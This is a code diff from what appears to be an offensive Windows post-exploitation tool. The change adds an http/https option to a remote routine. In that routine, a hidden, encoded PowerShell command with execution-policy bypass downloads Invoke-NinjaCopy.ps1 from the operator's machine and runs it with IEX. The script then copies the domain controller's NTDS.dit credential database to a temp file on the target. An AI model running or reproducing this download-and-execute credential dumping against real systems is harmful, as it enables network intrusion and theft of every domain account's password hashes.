@@ -975,12 +975,15 @@ class RemoteOperations:
             tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
             local_ip = self.__smbConnection.getSMBServer().get_socket().getsockname()[0]
 
+            protocol = 'http'
+            if args.ssl: protocol = 'https'
+
             command = """
-            IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-NinjaCopy.ps1');
+            IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-NinjaCopy.ps1');
             Invoke-NinjaCopy -Path "{ntdspath}" -LocalDestination "$env:systemroot\\Temp\\{tmpname}";
-            """.format(addr=local_ip, ntdspath=ntdsLocation, tmpname=tmpFileName)
-            
-            self.__executeRemote('%%COMSPEC%% /C powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % ps_command(command=command))
+            """.format(protocol=protocol, addr=local_ip, ntdspath=ntdsLocation, tmpname=tmpFileName)
+
+            self.__executeRemote('%%COMSPEC%% /C powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % ps_command(command))
             remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
 
         else:
